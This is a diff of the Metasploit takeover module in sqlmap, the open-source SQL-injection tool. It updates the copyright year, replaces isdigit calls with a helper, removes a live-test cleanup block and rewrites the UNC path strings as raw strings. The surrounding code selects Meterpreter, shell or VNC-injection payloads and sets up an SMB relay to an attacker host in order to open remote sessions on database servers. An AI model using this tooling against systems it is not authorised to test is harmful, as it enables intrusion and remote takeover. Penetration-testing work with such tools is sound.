@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -23,6 +23,7 @@ from lib.core.common import dataToStdout
 from lib.core.common import Backend
 from lib.core.common import getLocalIP
 from lib.core.common import getRemoteIP
+from lib.core.common import isDigit
 from lib.core.common import normalizePath
 from lib.core.common import ntToPosixSlashes
 from lib.core.common import pollProcess
@@ -154,7 +155,7 @@ class Metasploit(object):
 
         choice = readInput(message, default="%d" % default)
 
-        if not choice or not choice.isdigit() or int(choice) > maxValue or int(choice) < 1:
+        if not choice or not isDigit(choice) or int(choice) > maxValue or int(choice) < 1:
             choice = default
 
         choice = int(choice)
@@ -227,24 +228,21 @@ class Metasploit(object):
 
                     if not choice or choice == "2":
                         _payloadStr = "windows/meterpreter"
-
                         break
 
                     elif choice == "3":
                         _payloadStr = "windows/shell"
-
                         break
 
                     elif choice == "1":
                         if Backend.isDbms(DBMS.PGSQL):
                             logger.warn("beware that the VNC injection might not work")
-
                             break
 
                         elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                             break
 
-                    elif not choice.isdigit():
+                    elif not isDigit(choice):
                         logger.warn("invalid value, only digits are allowed")
 
                     elif int(choice) < 1 or int(choice) > 2:
@@ -571,13 +569,6 @@ class Metasploit(object):
                         errMsg += "to open a remote session"
                         raise SqlmapGenericException(errMsg)
 
-                if conf.liveTest and timeout:
-                    if initialized:
-                        send_all(proc, "exit\n")
-                        time.sleep(2)
-                    else:
-                        proc.kill()
-
             except select.error as ex:
                 # Reference: https://github.com/andymccurdy/redis-py/pull/743/commits/2b59b25bb08ea09e98aede1b1f23a270fc085a9f
                 if ex.args[0] == errno.EINTR:
@@ -695,9 +686,9 @@ class Metasploit(object):
         self._runMsfCliSmbrelay()
 
         if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
-            self.uncPath = "\\\\\\\\%s\\\\%s" % (self.lhostStr, self._randFile)
+            self.uncPath = r"\\\\%s\\%s" % (self.lhostStr, self._randFile)
         else:
-            self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self._randFile)
+            self.uncPath = r"\\%s\%s" % (self.lhostStr, self._randFile)
 
         debugMsg = "Metasploit Framework console exited with return "
         debugMsg += "code %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
